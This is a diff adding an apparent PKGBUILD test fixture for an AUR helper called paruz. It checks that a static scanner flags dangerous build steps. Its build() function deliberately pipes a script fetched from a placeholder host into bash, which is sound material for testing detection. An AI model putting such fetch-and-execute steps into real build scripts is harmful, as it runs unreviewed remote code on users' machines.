@@ -1,0 +1,18 @@
+# Test fixture for PLAN.md §11 test 1 — static gate blocks (DLE-001).
+# Not a real package; build() intentionally pipes a remote script into bash,
+# the exact "dangerous line execution" pattern aur-scan flags at critical.
+pkgname=paruz-test-dle-001
+pkgver=1.0
+pkgrel=1
+pkgdesc="paruz test fixture: curl | bash in build()"
+arch=('any')
+url="https://example.invalid"
+license=('MIT')
+
+build() {
+	curl -fsSL https://example.invalid/install.sh | bash
+}
+
+package() {
+	mkdir -p "$pkgdir/usr/share/$pkgname"
+}
